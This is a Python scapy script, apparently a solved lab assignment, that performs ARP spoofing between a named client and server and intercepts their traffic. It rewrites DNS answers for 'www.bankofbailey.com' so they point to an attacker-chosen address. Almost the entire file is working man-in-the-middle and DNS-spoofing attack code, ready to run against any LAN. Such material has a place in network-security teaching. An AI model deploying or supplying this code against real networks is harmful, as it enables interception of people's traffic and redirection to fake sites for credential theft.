# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=1, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    arp_packet= Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=IP)
    target_mac= srp(arp_packet, timeout=2, verbose=False)[0][0][1].hwsrc
    return target_mac

def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, serverIP, serverMAC) # Spoof server ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(src_ip, src_mac, dst_ip, dst_mac):
    debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")

    send(ARP(op=2 , pdst = dst_ip, hwdst = dst_mac, psrc = src_ip, hwsrc = src_mac))


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")

    send(ARP(op=2, pdst = dstIP, hwdst = dstMAC, psrc = srcIP, hwsrc = srcMAC))

# TODO: handle intercepted packets
def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC

   
    if IP in packet and Ether in packet:

        # From client to server, change the MAC address
        if packet[IP].src == clientIP and packet[IP].dst == serverIP:
            packet[Ether].src = attackerMAC
            packet[Ether].dst = serverMAC
            sendp(packet)

        #From server to client, change the DNS query result
        elif packet[IP].src == serverIP and packet[IP].dst == clientIP:
            packet[Ether].src = attackerMAC
            packet[Ether].dst = clientMAC

            if "www.bankofbailey.com" in str(packet["DNS Question Record"].qname):
                packet[DNS].an = DNSRR(rrname = packet[DNSQR].qname, rdata = "10.4.63.200")
                packet[IP].chksum = None
                packet[IP].len = None
                packet[UDP].chksum = None
                packet[UDP].len = None

            sendp(packet)
   
if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)

    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)











